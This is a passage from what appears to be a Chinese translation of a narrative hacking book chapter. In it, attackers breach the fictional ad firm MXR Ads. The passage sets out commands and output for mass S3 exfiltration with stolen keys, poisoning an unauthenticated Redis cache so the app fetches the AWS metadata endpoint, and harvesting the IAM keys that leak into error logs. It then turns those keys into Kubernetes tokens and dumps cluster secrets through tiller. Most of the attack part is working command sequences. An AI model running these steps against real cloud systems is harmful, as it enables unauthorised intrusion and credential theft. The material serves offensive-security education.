**"select ee.name, pp.email, pp.hash, ii.creative, ii.counter, ii.max_budget\**
**from insertions ii\**
**inner join entity ee on ee.id= ii.id_entity\**
**inner join profile pp on pp.id_entity= ii.id_entity\**
**where ee.name like '%gretsch%'"**

---
Name : Gretsch Politico
Email: eloise.stinson@gretschpolitico.com
Hash: c22fe077aaccbc64115ca137fc3a9dcf
Creative: s4d.mxrads.com/43ed90147211803d546734ea2d0cb/
12adad49658582436/vid/720/88b4ab3d165c1cf2.mp4
Counter: 16879
Maxbudget: 250000
---
`--snip--`
```

看起来 GP 的客户每一则广告都花费了成百上千美元，而目前有 200 条广告正在投放。真是一笔可观的收入。

我们遍历数据库中找到的所有创意 URL，并从 S3 获取它们。

还记得黑客们曾经需要小心设计外泄工具和技术，绕过数据丢失防护措施，并费劲地从公司网络中提取数据吗？是的，现在我们不需要再做这些了。

云服务提供商不关心你在哪里。只要你拥有正确的凭证，你可以下载任何你想要的内容。目标方可能会在月底收到一份昂贵的账单，但这几乎不会引起财务部门的任何怀疑。反正 MXR 广告公司一直在全球范围内提供这些视频。我们只是在一次性扫荡所有的内容。

考虑到涉及的创意数量（属于 GP 的几百个创意），我们将利用一些`xargs`魔法来并行化调用`get-object` API。我们准备了一个包含创意列表的文件，然后循环遍历每一行并将其传递给`xargs`：

```
root@Point1:~/creatives# cat list_creatives.txt | \
**xargs -I @ aws s3api get-object \**
**-P 16 \**
**--bucket s4d.mxrads.com \**
**--key @ \**
**$RANDOM**
```

`-I`标志是替换令牌，决定在哪里注入读取的行。`xargs`中的`-P`标志表示最大并发进程数（在我的机器上为 16）。最后，`RANDOM`是一个默认的 bash 变量，在每次评估时返回一个随机数字，它将成为下载的创意的本地名称。让我们看看我们抓取了多少创意：

```
root@Point1:~/creatives# ls -l |wc -l
264
```

我们得到了 264 个创意——也就是 264 条仇恨信息、PS 合成的图像、修改过的视频和精心剪辑的场景，强调两极化的信息。有些图像甚至劝阻人们投票。显然，为了得到理想的选举结果，什么都不在话下。

在获取这些视频文件时，我们成功完成了第四章的目标 3。我们还有两个关键目标需要完成：揭示 GP 客户的真实身份，并了解数据分析活动的范围。

我们回到 S3 存储桶列表，试图寻找与一些机器学习或分析技术（如 Hadoop、Spark、Flink、Yarn、BigQuery、Jupyter 等）相关的线索或参考，但没有找到任何我们能访问到的有意义的内容。

那么，交付链中的另一个组件怎么样？我们列出了在`prod`命名空间中运行的所有 Pod，寻找灵感：

```
shell> **./kubectl get pods -n prod -o="custom-columns=\**
**NODE:.spec.nodeName,\**
**POD:.metadata.name"**

NODE                         POD
ip-192-168-133-105.eu-...    vast-check-deployment-d34c-7qxm
ip-192-168-21-116.eu-...     ads-rtb-deployment-13fe-3evx
ip-192-168-86-120.eu-...     iab-depl-69dc-0vslf
ip-192-168-38-101.eu-...     cpm-factor-depl-3dbc-3qozx
`--snip--`
```

这些 Pod 的名称晦涩难懂。广告行业，和华尔街一样，有一个不太好的习惯，那就是躲在晦涩的缩写背后，制造疑惑和混乱。因此，在维基百科上研究了几个小时解读这些名称后，我们决定专注于`ads-rtb`应用。RTB 代表*实时竞价*，它是一种用于进行拍卖的协议，从而决定在网站上展示特定广告，而不是其他广告。

每当用户在与 MXR Ads 合作的网站上加载页面时，一段 JavaScript 代码会触发对 MXR Ads 的供应方平台（SSP）的调用，进行一次拍卖。MXR Ads 的 SSP 将请求转发给其他 SSP、广告公司或品牌，收集它们的竞标。每个代理商，作为需求方平台（DSP），会出价一定的金额来展示他们选择的广告。他们愿意出价的金额通常基于多个标准：网站的 URL、广告在页面上的位置、页面中的关键词，以及最重要的，用户的数据。如果这些标准符合广告主的需求，他们会出价更高。这场拍卖通过 RTB 协议自动进行。

可能 RTB Pod 并没有访问个人数据，仅仅是盲目地将请求转发给由 GP 托管的服务器，但考虑到 RTB 协议在广告投放中的核心地位，这些 Pod 很可能将引导我们进入下一个目标。

## Redis 和实时竞价

我们拉取 ads-rtb 的 Pod 清单：

```
spec:
    containers:
    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/ads-rtb
`--snip--`
    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/redis-rtb
      name: rtb-cache-mem
      ports:
      - containerPort: 6379
        protocol: TCP
    nodeName: ip-192-168-21-116.eu-west-1.compute.internal
    hostIP: 192.168.21.116
    podIP: 10.59.12.47
```

看！一个 Redis 容器正在与 RTB 应用程序并行运行，监听端口 6379。

如前所述，我尚未见过在内部网络中受身份验证保护的 Redis 数据库，所以你可以想象我们的 Redis 藏在 Kubernetes 集群中的 Pod 里，显然是张开双臂欢迎我们的。我们下载 Redis 客户端并开始列出数据库中保存的键：

```
shell> **apt install redis-tools**

shell> **redis -h 10.59.12.47 --scan * > all_redis_keys.txt**

shell> **head -100 all_redis_keys.txt**
vast_c88b4ab3d_19devear
select_3799ec543582b38c
vast_5d3d7ab8d4
`--snip--`
```

每个 RTB 应用程序都配有一个伴随的 Redis 容器，作为本地缓存存储各种对象。键 `select_3799ec543582b38c` 存储着一个字节序列化的 Java 对象。我们可以从中看出，因为任何 Java 序列化对象都有一个十六进制字符串标记 00 05 73 72，我们在查询该键的值时正好看到了这个标记：

```
shell> **redis -h 10.59.12.47 get select_3799ec543582b38c**

AAVzcgA6Y29tLm14cmFkcy5ydGIuUmVzdWx0U2V0JEJpZFJlcXVlc3SzvY...

shell> **echo -ne AAVzcgA6Y29tLm14cmFkcy5ydGI...| base64 -d | xxd**

aced **0005 7372** 003a 636f 6d2e 6d78 7261  ......sr.:com.mxra
6473 2e72 7462 2e52 6573 756c 7453 6574  ds.rtb.ResultSet$B
2442 6964 5265 7175 6573 74b3 bd8d d306  $BidRequest.......
091f ef02 003d dd...
```

为了避免从数据库中反复获取相同的结果并无谓地消耗网络延迟的高昂成本，ads-rtb 容器将之前的数据库结果（如字符串、对象等）保存在本地 Redis 容器缓存中。如果相同的请求再次出现，它几乎可以立即从 Redis 中获取相应的结果。

这种缓存形式在初期应用设计时可能被视为一个绝妙的主意，但它涉及一个危险且常被忽视的操作：反序列化。

### 反序列化

当一个 Java 对象（或几乎任何高级语言中的对象，如 Python、C# 等）被反序列化时，它会从一串字节流中转回为一系列属性，从而填充一个实际的 Java 对象。这个过程通常是通过目标类的 `readObject` 方法来完成的。

这里有一个简单的例子，展示了 ads-rtb 内部可能发生的情况。在代码的某个地方，应用程序从 Redis 缓存加载了一个字节数组，并初始化了一个输入流：

```
// Retrieve serialized object from Redis
byte[] data = FetchDataFromRedis()
// Create an input stream
ByteArrayInputStream bis = new ByteArrayInputStream(data);
```

接下来，这一系列字节由`ObjectInputStream`类消耗，该类实现了`readObject`方法。这个方法提取类、类签名以及静态和非静态属性，实际上是将一系列字节转换为一个真实的 Java 对象：

```
// Create a generic Java object from the stream
ObjectInputStream ois = new ObjectInputStream(bis);

// Calling readObject of the bidRequest class to format/prepare the raw data
BidRequest objectFromRedis = 1(BidRequest)ois.readObject();
```

这时我们可能会找到突破口。我们并没有调用`ObjectInputStream`的默认`readObject`方法，而是调用了目标类`BidRequest`1 中定义的自定义`readObject`方法。

这个自定义的`readObject`方法几乎可以对接收到的数据做任何操作。在接下来的这个无聊的场景中，它只是将一个名为`auctionID`的属性转换为小写，但任何事情都有可能发生：它可以进行网络调用、读取文件，甚至执行系统命令。而且它是根据从不可信的序列化对象中获得的输入来执行的：

```
// BidRequest is a class that can be serialized
class BidRequest implements Serializable{
    public String auctionID;
    private void readObject(java.io.ObjectInputStream in){
       in.defaultReadObject();
       this.auctionID = this.auctionID.toLowerCase();
       // Perform more operations on the object attributes
    }
}
```

因此，挑战在于制作一个包含正确值的序列化对象，并引导`readObject`方法的执行流程，直到它到达系统命令执行或其他有趣的结果。这看起来可能是一个很长的过程，但这正是几位研究人员几年前所做的。唯一的不同是，他们发现了这个漏洞存在于 commons-collections 库中`readObject`方法的一个类里，而 commons-collections 是 Java 运行时环境（JRE）中默认随附的一个 Java 库（可以查看 Matthias Kaiser 的讲座《Exploiting Deserialization Vulnerabilities in Java》）。

在这次讲座后的短暂时刻，反序列化漏洞几乎与 Windows 漏洞在数量上相媲美，真是让人难以置信！故障类的`readObject`方法在 commons-collections 库的更新版本（从 3.2.2 开始）中被修复，但由于调优 Java 虚拟机（JVM）通常是一个危险的过程，根据民间传说和古老的智慧，许多公司抵制升级 JVM 的冲动，从而为反序列化漏洞敞开了大门。

首先，我们需要确保我们的 pod 存在这个漏洞。

如果你还记得，在第五章我们遇到了一个名为 mxrads-dl 的存储桶，它似乎充当了一个公共 JAR 文件和二进制文件的私人仓库。这个存储桶应该包含像 ads-rtb 这样的应用程序使用的几乎所有版本的外部 JAR 文件。因此，答案可能就在里面。我们通过搜索存储桶中的键，查找由 ysoserial 工具支持的易受攻击的 Java 库（[`github.com/frohoff/ysoserial/`](https://github.com/frohoff/ysoserial/)），该工具用于制作有效载荷，触发许多 Java 类中的反序列化漏洞。该工具的 GitHub 页面列出了许多可以被利用的著名库，如 commons-collections 3.1、spring-core 4.1.4 等。

```
root@Point1:~/# aws s3api list-objects-v2 --bucket mxrads-dl > list_objects_dl.txt
root@Point1:~/# grep 'commons-collections' list_objects_dl.txt

Key: jar/maven/artifact/org.apache.commons-collections/commons-collections/3.3.2
`--snip--`
```

我们找到了 commons-collections 版本 3.3.2，差一点就能成功了。我们本可以尝试盲目利用，假设该存储桶仍然使用本地的旧版本 commons-collections 库，但胜算不大，因此我们继续向前推进。

### 缓存投毒

我们继续探索 Redis 缓存中的其他密钥，希望能获得一些新的灵感：

```
shell> **head -100 all_redis_keys.txt**
vast_c88b4ab3d_19devear
select_3799ec543582b38c
`vast_c88b4ab3d_19devear`
`--snip--`
```

我们列出密钥 `vast_c88b4ab3d_19devear` 的内容，这次找到了一个 URL：

```
shell> **redis -h 10.59.12.47 get vast_c88b4ab3d_19devear**
https://www.goodadsby.com/vast/preview/9612353
```

VAST（视频广告服务模板）是一个标准的 XML 模板，用于向浏览器视频播放器描述广告内容，包括媒体下载的位置、要发送的跟踪事件、在多少秒后、发送到哪个端点等等。以下是一个 VAST 文件的示例，指向存储在 *s4d.mxards.com* 上的名为“Exotic Approach”的广告视频文件：

```
<VAST version="3.0">
<Ad id="1594">
  <InLine>
    <AdSystem>MXR Ads revolution</AdSystem>
    <AdTitle>Exotic approach</AdTitle>
`--snip--`
    <MediaFile id="134130" type="video/mp4" 
        bitrate="626" width="1280" height="720">
       http://s4d.mxrads.com/43ed9014730cb/12ad82436/vid/720/88b4a1cf2.mp4
`--snip--`
```

XML 解析器可以是非常挑剔的怪物——只要标签错误，整个系统就会崩溃。解析器会将比原文件还要大的堆栈追踪信息输出到标准错误输出中。出现了许多异常需要被正确处理……并且记录日志！

你能明白我想表达的意思吗？我们已经获得了访问处理与广告投放相关的应用日志的 pod。如果我们将 VAST URL 替换为例如返回 JSON/文本格式的元数据 API URL，应用程序是否会向 Elasticsearch 审计存储发送详细错误，我们可以查看？

只有一个办法能弄清楚。我们将十几个有效的 VAST URL 替换为臭名昭著的端点 URL `http://169.254.169.254/latest/meta-data/iam/info`，如下所示：

```
shell> **redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\**
**http://169.254.169.254/latest/meta-data/iam/info**
OK
```

这个元数据端点应该返回一个 JSON 响应，包含附加到运行 ads-rtb pod 的节点上的 IAM 角色。我们知道角色存在，因为 EKS 要求它。附加分数：这个角色有一些有趣的权限。

大约需要 10 分钟才能触发一个被毒化的缓存条目，但我们最终得到了我们期待的详细错误信息。我们可以通过搜索 MXR Ads 的 AWS 账户 ID 886371554408 来定位日志索引中的错误：

```
shell> **curl "10.20.86.24:9200/log/_search?pretty&size=10&q=message: 886371554408"**

"level": "Critical"
"message": "...\"InstanceProfileArn\" : 
\" arn:aws:iam::886477354405:instance-profile/eks-workers-prod-common-NodeInstanceProfile-
BZUD6DGQKFGC\"...org.xml.sax.SAXParseException...Not valid XML file"
```

触发查询的 pod 正在运行具有 IAM 角色 `eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC`。我们现在要做的就是再次毒化 Redis 缓存，但这次需要将角色名附加到 URL 上，以便获取其临时访问密钥：

```
shell> **redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\**
**http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-workers-prod-common-NodeInstanceRole-BZUD6DGQKFGC**
OK
```

几分钟后，我们终于得到了梦寐以求的奖品，有效的 AWS 访问密钥，具有 EKS 节点权限，并且可以在日志索引中看到：

```
shell> **curl "10.20.86.24:9200/log/_search?pretty&size=10&q=message: AccessKeyId"**

"level": "Critical"
"message": "...\"AccessKeyId\" : \"ASIA44ZRK6WS3R64ZPDI\", \"SecretAccessKey\" :
\"+EplZs...org.xml.sax.SAXParseException...Not valid XML file"
```

根据 AWS 文档，附加到 Kubernetes 节点的默认角色将具有基本的 EC2 权限，以发现其环境：`describe-instances`、`describe-security-groups`、`describe-volumes`、`describe-subnets` 等。让我们试一下这些新凭证，并列出 `eu-west-1` 区域（爱尔兰）的所有实例：

```
root@Point1:~/# vi ~/.aws/credentials
[node]
aws_access_key_id = ASIA44ZRK6WS3R64ZPDI
aws_secret_access_key = +EplZsWmW/5r/+B/+J5PrsmBZaNXyKKJ
aws_session_token = AgoJb3JpZ2luX2...

root@Point1:~/# aws ec2 describe-instances \
**--region=eu-west-1 \**
**--profile node**
`--snip--`
"InstanceId": "i-08072939411515dac",
"InstanceType": "c5.4xlarge",
"KeyName": "kube-node-key",
"LaunchTime": "2019-09-18T19:47:31.000Z",
"PrivateDnsName": "ip-192-168-12-33.eu-west-1.compute.internal",
"PrivateIpAddress": "192.168.12.33",
"PublicIpAddress": "34.245.211.33",
"StateTransitionReason": "",
"SubnetId": "subnet-00580e48",
"Tags": [
  {
  "Key": "k8s.io/cluster-autoscaler/prod-euw1",
  "Value": "true"
  }],
`--snip--`
```

一切看起来都很顺利。我们得到了大约 700 台 EC2 机器的完整描述，包括私有和公共 IP 地址、防火墙规则、机器类型等。虽然这是很多机器，但对于像 MXR Ads 这样规模的公司来说，这个数字相对较小。有什么地方不对劲。

我们获得的所有机器都有一个特殊标签 `k8s.io/cluster-autoscaler/prod-euw1`。这是 autoscaler 工具（[`github.com/kubernetes/autoscaler/`](https://github.com/kubernetes/autoscaler/)）常用的标签，用于标记那些可以在 pod 活动较低时被销毁的可丢弃节点。MXR Ads 可能利用了这个标签来限制分配给 Kubernetes 节点的默认权限范围。确实非常聪明。

有讽刺意味的是，标签泄露了 Kubernetes 集群的名称 `(prod-euw1)`，这是调用 `describeCluster` API 时所需的一个参数。那么我们就调用 `describeCluster` 吧：

```
root@Point1:~/# export AWS_REGION=eu-west-1
root@Point1:~/# aws eks describe-cluster --name prod-euw1 --profile node
{  "cluster": {
  1 "endpoint": "https://BB061F0457C63.yl4.eu-west-1.eks.amazonaws.com",
  2 "roleArn": "arn:aws:iam::886477354405:role/eks-prod-role",
    "vpcId": "vpc-05c5909e232012771",
    "endpointPublicAccess": false,
    "endpointPrivateAccess": true,
`--snip--`
```

API 服务器是那个长得很方便的 URL，名为 `endpoint` 1。在一些罕见的配置下，它可能会暴露在互联网中，这样就可以更加方便地查询或更改集群的期望状态。

我们获得的这个角色可以做的远不止仅仅探索 Kubernetes 资源。在默认设置下，这个角色有权将任何安全组附加到集群中的任何节点上。既然我们已经被授予了这个角色，我们只需要找到一个暴露所有端口到互联网的现有安全组——这种安全组总是存在——并将其分配给托管我们当前 shell 的机器。

不过，事情并不像想象的那么简单。虽然可能很诱人将我们手工制作的基于 S3 的反向 shell 升级为完整的双工通信通道，但很可能 MXR Ads 通过声明理想中应该运行的机器数量、网络配置和分配给每台机器的安全组来 Terraform 了他们的 Kube 集群。如果我们更改这些参数，下一次运行 `terraform plan` 命令时就会标记出变化。允许所有流量进入随机节点的安全组只会引发我们宁愿避免的问题。

我们继续玩弄附加到 Kube 节点的角色，但很快就达到了极限。它被严格限制到几乎失去了任何兴趣。我们只能描述集群组件的基本信息。我们无法访问机器的用户数据，几乎无法在不引起警报的情况下更改任何东西。

想想看，为什么我们只将这个节点视为 AWS 资源？它首先是一个 Kubernetes 资源，而且是一个特权资源。这个节点在 AWS 环境中可能只有可笑的权限，但在 Kubernetes 世界中，它是一个至高无上的存在，因为它在其领域内对 pods 拥有生死权。

如前所述，每个节点都有一个运行中的过程叫做 kubelet，它会轮询 API 服务器以生成或终止新 pod。运行的容器意味着挂载卷、注入密钥...它是如何实现这种级别的访问权限的？

答案：通过节点的实例配置文件——也就是我们一直在操作的那个角色。

当你在 EKS 上设置 Kubernetes 集群时，第一个要配置的内容之一是在启动节点之前，将节点 IAM 角色名称添加到 `system:nodes` 组中。该组绑定到 Kubernetes 角色 `system:node`，该角色对各种 Kube 对象具有读取权限：服务、节点、Pods、持久卷以及其他 18 种资源！

我们所要做的就是请求 AWS 将我们的 IAM 访问密钥转换为有效的 Kubernetes 令牌，这样我们就可以作为 `system:nodes` 组的有效成员查询 API 服务器。为此，我们调用 `get-token` API：

```
root@Point1:~/# aws eks get-token --cluster-name prod-euw1 --profile node
{
    "kind": "ExecCredential",
    "apiVersion": "client.authentication.k8s.io/v1alpha1",
    "status": {
        "expirationTimestamp": "2019-11-14T21:04:23Z",
        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMuYW1hem..."
    }
}
```

我们这次获得的令牌不是标准的 JWT；相反，它包含了调用 STS 服务的 `GetCallerIdentity` API 所需的构建块。让我们使用 `jq`、`cut`、`base64` 和 `sed` 等工具解码我们之前获得的部分令牌：

```
root@Point1:~/# aws eks get-token --cluster-name prod-euw1 \
**| jq -r .status.token \**
**| cut -d"_" -f2 \**
**| base64 -d \**
**| sed "s/&/\n/g"**

https://sts.amazonaws.com/?Action=GetCallerIdentity
&Version=2011-06-15
&X-Amz-Algorithm=AWS4-HMAC-SHA256
&X-Amz-Credential=ASIA44ZRK6WSYQ5EI4NS%2F20191118/us-east-1/sts/aws4_request
&X-Amz-Date=20191118T204239Z
&X-Amz-Expires=60
&X-Amz-SignedHeaders=host;x-k8s-aws-id
&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX/////...
```

JWT 实际上是一个编码过的预签名 URL，包含节点的身份。任何人都可以重新播放这个 URL 来验证该节点是否确实是它声称的那样。EKS 接收到这个令牌时，正是这么做的。正如 AWS IAM 通过 JWT 信任 OpenID 来识别和认证 Kube 用户一样，EKS 也通过 Web 调用 `sts.amazon.com` 端点信任 IAM 来做同样的事情。

我们可以像之前一样使用这个令牌通过 `curl` 命令向 API 服务器发起请求，但我们最好生成一个完整的 Kubectl 配置文件，将其下载到我们那个值得信赖的 Pod 中：

```
root@Point1:~/# aws eks update-kubeconfig --name prod-euw1 --profile node

Updated context arn:aws:eks:eu-west-1:886477354405:cluster/prod-euw1 in /root/.kube/config
shell> **wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/config**

shell> **mkdir -p /root/.kube && cp config /root/.kube/**
```

测试我们是否获得新权限的一个快速方法是列出 `kube-system` 命名空间中的 Pods。这个命名空间包含了主控 Pod —— kube api-server、etcd、coredns —— 以及其他用于管理 Kubernetes 的关键 Pod。记住，我们之前的令牌仅限于 `prod` 命名空间，因此获得对 `kube-system` 的访问权限将是一个巨大的进步：

```
shell> **kubectl get pods -n kube-system**

NAME                       READY   STATUS    RESTARTS   AGE
aws-node-hl227             1/1     Running   0          82m
aws-node-v7hrc             1/1     Running   0          83m
coredns-759d6fc95f-6z97w   1/1     Running   0          89m
coredns-759d6fc95f-ntq88   1/1     Running   0          89m
kube-proxy-724jd           1/1     Running   0          83m
kube-proxy-qtc22           1/1     Running   0          82m
`--snip--`
```

我们成功列出了 Pods！太棒了！显然，由于我们处于托管的 Kubernetes 中，最重要的 Pods（kube-apiserver、etcd、kube-controller-manager）被 Amazon 隐藏起来，但其余的 Pods 还是能看到。

### Kube 权限提升

让我们好好利用我们新的权限。我们要做的第一件事是获取 Kube 中定义的所有秘密；然而，当我们尝试时，我们发现即使 `system:nodes` 组理论上有权限这么做，它也不能随意请求秘密：

```
shell> **kubectl get secrets --all-namespaces**

Error from server (Forbidden): secrets is forbidden:
User "system:node:ip-192-168-98-157.eu-west-1.compute.internal" cannot list
resource "secrets" in API group "" at the cluster scope: can only read
namespaced object of this type
```

在 Kubernetes 1.10 版本中引入了一项安全特性，限制了节点的过度权限：节点授权。此特性基于经典的基于角色的访问控制之上。一个节点只能在该节点上有需要该秘密的调度 Pods 时，才能获取该秘密。当这些 Pods 被终止时，节点就会失去访问该秘密的权限。

不过，没必要惊慌。任何随机节点通常都会在任何给定时刻托管数十个，甚至上百个不同的 pod，每个 pod 都有其自己的秘密、数据卷等等。也许今天晚上 11 点，我们的节点只能获取到一个虚拟数据库的密码，但给它 30 分钟，kube-scheduler 可能会将一个具有集群管理员权限的 pod 发送到该节点。关键在于在合适的时刻，处于合适的节点。我们列出当前机器上运行的 pods，以找出我们有权获取哪些秘密：

```
shell> **kubectl get pods --all-namespaces --field-selector\**
**spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal**

prod    ads-rtb-deployment-13fe-3evx   1/1  Running
prod    ads-rtb-deployment-12dc-5css   1/1  Running
prod    kafka-feeder-deployment-23ee   1/1  Running
staging digital-elements-deploy-83ce   1/1  Running
test    flask-deployment-5d76c-qb5tz   1/1  Running
`--snip--`
```

这个单一节点托管着大量异构的应用。看起来很有希望。这个节点很可能能够访问大量跨不同组件的秘密。我们使用自定义解析器自动列出每个 pod 加载的秘密：

```
shell> .**/kubectl get pods -o="custom-columns=\**
**NS:.metadata.namespace,\**
**POD:.metadata.name,\**
**ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\**
**FILESECRET:.spec.volumes[*].secret.secretName" \**
**--all-namespaces \**
**--field-selector spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal**

NS       POD             ENV                FILESECRET
prod     kafka...        awsUserKafka       kafka-token-653ce
prod     ads-rtb...      CassandraDB        default-token-c3de
prod     ads-rtb...      CassandraDB        default-token-8dec
staging  digital...      GithubBot          default-token-88ff
test     flask...        AuroraDBTest       default-token-913d
`--snip--`
```

一个宝藏！Cassandra 数据库、AWS 访问密钥、服务账户、Aurora 数据库密码、GitHub 令牌、更多的 AWS 访问密钥……这还是真的吗？我们使用相当明确的命令`kubectl get secret`下载（并解码）每一个秘密，如下所示：

```
shell> **./kubectl get secret awsUserKafka  -o json -n prod \**
**| jq .data**
  "access_key_id": "AKIA44ZRK6WSSKDSKQDZ",
  "secret_key_id": "93pLDv0FlQXnpyQSQvrMZ9ynbL9gdNkRUP1gO03S"

shell> **./kubectl get secret githubBot -o json -n staging\**
**|jq .data**
  "github-bot-ro": "9c13d31aaedc0cc351dd12cc45ffafbe89848020"

shell> **./kubectl get secret kafka-token-653ce -n prod -o json | jq -r .data.token**
"ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklpSjkuZ...
```

看看我们正在获取的所有这些凭证和令牌！而且我们还没有完成，远远没有。看看，这只是一个恰巧运行着不安全 Redis 容器的 ads-rtb pod 的节点。还有 200 个类似的 pods 分布在 700 台机器上，都会受到相同的缓存污染技术的影响。

这种黑客攻击的公式很简单：定位这些 pods（使用`get pods`命令），连接到 Redis 容器，替换一些 VAST URL 为元数据 API，收集溢出到审计数据库的机器临时 AWS 密钥，将它们转换为 Kubernetes 令牌，然后获取由节点上运行的 pods 加载的秘密。

我们重复这一过程，检查每个节点，直到在输出中注意到一些非常有趣的东西：

```
shell> **./kubectl get pods -o="custom-columns=\**
**NS:.metadata.namespace,\**
**POD:.metadata.name,\**
**ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\**
**FILESECRET:.spec.volumes[*].secret.secretName" \**
**--all-namespaces \**
**--field-selector spec.nodeName=ip-192-168-133-34.eu-west-1.compute.internal**

NS              POD             ENV            FILESECRET
1 kube-system     tiller          <none>         tiller-token-3cea
prod            ads-rtb...      CassandraDB    default-token-99ed
```

我们碰上了幸运的节点编号 192.168.133.34 1，它表示托管了一些属于强大`kube-system`命名空间的 pods。这个 tiller pod 有 90%的可能性具有集群管理员权限。它在*helm* *v2*中扮演着核心角色，这是一个用于在 Kubernetes 上部署和管理应用的包管理器。我们伪装成这个节点并下载 tiller 的服务账户令牌：

```
root@Point1:~/# aws eks update-kubeconfig --name prod-euw1 --profile node133
`--snip--`
shell> **./kubectl get secret tiller-token-3cea \**
**-o json \**
**--kubeconfig ./kube/config_133_34 \**
**| jq -r .data.token**

ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklpSjkuZXlKcGMzTWlPaU...
```

拿到这个强大的账户后，我们可以用一个命令获取所有秘密。去他妈的节点授权！我们将账户令牌写入一个有效的 Kubectl 配置文件，命名为*tiller_config*，并用它来查询集群：

```
shell> **kubectl get secrets \**
**--all-namespaces \**
**-o json \**
**--kubeconfig ./kube/tiller_config**

"abtest_db_user": "abtest-user-rw",
"abtest_db_pass": "azg3Wk+swUFpNRW43Y0",
"api_token": "dfb87c2be386dc11648d1fbf5e9c57d5",
"ssh_metrics": "--- BEGIN SSH PRIVATE KEY --- ..."
"github-bot-ro": "9c13d31aaedc0cc351dd12cc45ffafbe89848020"
```

从中，我们获取了 100 多个凭证，涵盖了几乎所有的数据库：Cassandra、MySQL，等等。如果它与广告投放相关，放心，我们有办法访问它。我们甚至恢复了一些 SSH 私钥。我们还不知道如何使用它们，但这应该不需要我们太久就能弄明白。

我们还获得了几把有效的 AWS 访问密钥，其中一把属于名为 Kevin Duncan 的开发人员。这将非常有用。我们将其添加到我们的*凭证*文件中，并执行一次 API 调用以确认它们确实有效：

```
root@Point1:~/# vi ~/.aws/credentials
[kevin]
aws_access_key_id = AKIA44ZRK6WSSKDSKQDZ
aws_secret_access_key = 93pLDv0FlQXnpy+EplZsWmW/5r/+B/+KJ

root@Point1:~/# aws iam get-user --profile kevin
 "User": {
    "Path": "/",
    "UserName": "kevin.duncan",
    "Arn": "arn:aws:iam::886371554408:user/kevin.duncan",
```

最后，我们还确保获取了属于`github-bot-ro`的 GitHub 令牌。我们通过执行以下几行 Python 代码，确保它仍然有效：

```
root@Point1:~/# python3 -m pip install PyGithub
root@Point1:~/# python3

>>> **from github import Github**
>>> **g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")**
>>> **print(g.get_user().name)**
mxrads-bot-ro
```

他们最终是对的。Kubernetes 确实很有趣！

我们可以安全地说，目前我们掌控着 MXR Ads 的交付基础设施。我们仍然不知道个人资料定向是如何工作的，或者 Gretsch Politico 的最终客户是谁，但我们可以修改、删除和阻止他们的所有活动—可能还包括更多操作。

在我们深入这个“兔子洞”之前，我们需要巩固我们辛苦取得的立足点。容器具有很高的波动性，可能会使我们当前的访问权限面临风险。只需要重新部署一次调查应用程序，就能终止我们的 Shell 访问—这样，我们对 MXR Ads 的 Kubernetes 集群的主要入口点也将消失。

## 资源

+   更多关于 Kubernetes 中 RBAC 的信息：[`www.liquidweb.com/kb/kubernetes-rbac-authorization/`](https://www.liquidweb.com/kb/kubernetes-rbac-authorization/)。

+   John Lambert 关于防守者心态的开创性文章：[`github.com/JohnLaTwC/Shared`](https://github.com/JohnLaTwC/Shared)。

+   JSON Web 令牌简介：[`bit.ly/35JTJyp`](http://bit.ly/35JTJyp)。

+   Kubernetes API 参考：[`www.sparcflow.com/docs/kube-api-v1.19.html`](https://www.sparcflow.com/docs/kube-api-v1.19.html)。

+   Kubectl 命令列表：[`kubernetes.io/docs/reference/generated/kubectl/kubectl-commands`](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands)。

+   有关 OpenID 的信息，它是一种用于将身份验证委托给第三方的身份验证标准：[`developers.onelogin.com/openid-connect/`](https://developers.onelogin.com/openid-connect/)。

+   附加到 Pods 的 IAM 角色：[`docs.aws.amazon.com/eks/latest/userguide/worker_node_IAM_role.html`](https://docs.aws.amazon.com/eks/latest/userguide/worker_node_IAM_role.html)。

+   AWS 关于管理 EKS 的自动扩展组的文档：[`amzn.to/2uJeXQb`](https://amzn.to/2uJeXQb)。

+   探索 Kubernetes 中的网络策略：[`banzaicloud.com/blog/network-policy/`](https://banzaicloud.com/blog/network-policy/)。

+   在 Minikube 集群上安装 Helm 和 Tiller 的操作步骤：[`bit.ly/2tgPBIQ`](http://bit.ly/2tgPBIQ)。

+   实时竞价的解释：[`digiday.com/media/what-is-real-time-bidding/`](https://digiday.com/media/what-is-real-time-bidding/)。
